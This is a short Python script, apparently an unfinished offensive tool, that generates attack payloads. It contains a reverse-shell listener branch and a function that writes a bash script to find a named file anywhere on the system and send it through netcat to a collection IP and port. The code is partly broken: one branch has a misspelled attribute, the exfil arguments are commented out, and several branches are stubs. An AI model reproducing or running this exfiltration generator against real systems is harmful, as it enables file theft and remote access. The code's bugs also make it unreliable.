import argparse
import socket

def main():
    parser = argparse.ArgumentParser(description='Generates payload for desired architecture.')

    #Required arguments
    parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
    parser.add_argument('-ta', type=str, default=None, help='Target Server Host', dest='targetHostAddress', required=True)
    parser.add_argument('-tp', type=int, default=None, help='Target Server Port', dest='targetHostPort', required=True)
    #parser.add_argument('-f', type=str,  default=None, help='File you wish to exfil', dest='exfilFile', required=True)
    #parser.add_argument('-i', type=str,  default=None, help='collection ip address', dest='collectionIP', required=True)
    #parser.add_argument('-r', type=str,  default=None, help='collection port', dest='collectionPort', required=True)
    #parser.add_argument('-a', type=str,  default=None, help='Target architecture: ubuntux86', dest='targetArch', required=True)

    #Optional arguments
    #parser.add_argument('-o', type=str,  default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)

    args = parser.parse_args()

    #System Information Retrieval Payload
    if(args.payloadChoice == "SysInfo"):
        return

    #Reverse Shell Payload
    if(args.payloadChoice == "RShell"):
        s = socket.socket()
        s.bind((args.targetHostAddress, args.targetHostPort))
        s.listen(5)
        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")

    #Command Execution Payload
    if(args.payloadChoce == "CExe"):
        print("Execute")

    #File-upload Payload
    if(args.payloadChoice == "upload"):
        print("Upload")

    #File-download Payload
    #The Exfil operation will download a target file from the server.
    if(args.payloadChoice == "exfil" ):
        GenExfil(args.exfilFile, args.collectionIP, args.collectionPort, args.payloadName)
        print("Exfil Payload Generated! \n")
        #Still need to connect to server, upload a the exfil file, and then download the desired file

    return

def GenExfil(exfilFile, collectionIP, collectionPort, payloadName):
    ExfilPayloadText = "#!/bin/bash \n"
    ExfilPayloadText += "EXFILPATH=$(find / -name '" + exfilFile + "' | grep " + exfilFile + ")\n"
    ExfilPayloadText += "nc " + collectionIP + " " + collectionPort + " < $EXFILPATH \n"
    f = open(payloadName, "w")
    f.write(ExfilPayloadText)
    f.close()
    return

if __name__ == "__main__":
    main()
